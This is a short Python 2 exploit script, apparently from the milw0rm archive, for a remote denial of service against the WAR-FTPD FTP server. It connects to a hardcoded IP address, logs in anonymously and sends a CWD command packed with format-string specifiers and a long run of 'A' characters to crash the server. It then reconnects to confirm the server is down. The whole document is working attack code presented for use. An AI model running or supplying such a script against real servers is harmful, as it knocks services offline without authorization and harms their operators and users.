#!/usr/bin/env python

import sys
import ftplib

print "WAR_FTPD Remote Denial Of Service (DOS)"
print "Copyright (c) Joxean Koret"
print

target = "192.168.1.13"
targetPort = "21"

try:
    ftp = ftplib.FTP()

    print "[+] Connecting to target "
    msg = ftp.connect(target, targetPort)
    print "[+] Ok. Target banner"
    print msg
    print
    print "[+] Trying to logging anonymously"
    msg = ftp.login() # Anonymous
    print "[+] Ok. Message"
    print msg
    print
except:
    print "[!] Exploit doesn't work. " + str(sys.exc_info()[1])
    sys.exit(0)

a = "%s%s"
"""
for i in range(0):
    a += a
"""
b = "AAAA"

for i in range(6):
    b += b

a = a + b

print "[+] Exploiting with a buffer of " + str(len(a)) + " byte(s) ... "

try:
    ftp.cwd(a)
except:
    print "[+] Exploit apparently works. Trying to verify it ... "

    try:
        ftp.connect(target, targetPort)
        print "[!] No, it doesn't work [" + str(sys.exc_info()[1]) + "] :("
    except:
        print "[!] Ok. Server is dead, exploit successfully executed. "

# milw0rm.com [2006-11-07]
